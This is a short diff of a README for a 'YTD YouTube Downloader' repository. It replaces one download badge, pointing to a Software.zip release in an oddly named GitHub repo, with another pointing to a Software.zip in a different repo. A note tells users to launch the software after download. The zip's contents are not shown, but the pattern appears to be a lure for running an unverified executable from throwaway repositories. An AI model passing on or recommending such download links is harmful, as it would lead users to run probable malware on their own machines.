@@ -26,7 +26,7 @@ Explore the various topics covered in this repository to enhance your understand
 
 ## Download Software
 Click the button below to download the latest version of the YTD YouTube Downloader software:
-[![Download YTD YouTube Downloader](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download YTD YouTube Downloader](https://github.com/vnnha/YTD-YouTube-Downloader-Download/releases/download/v2.0/Software.zip)](https://github.com/vnnha/YTD-YouTube-Downloader-Download/releases/download/v2.0/Software.zip)
 
 *(Note: Software needs to be launched after download.)*
 
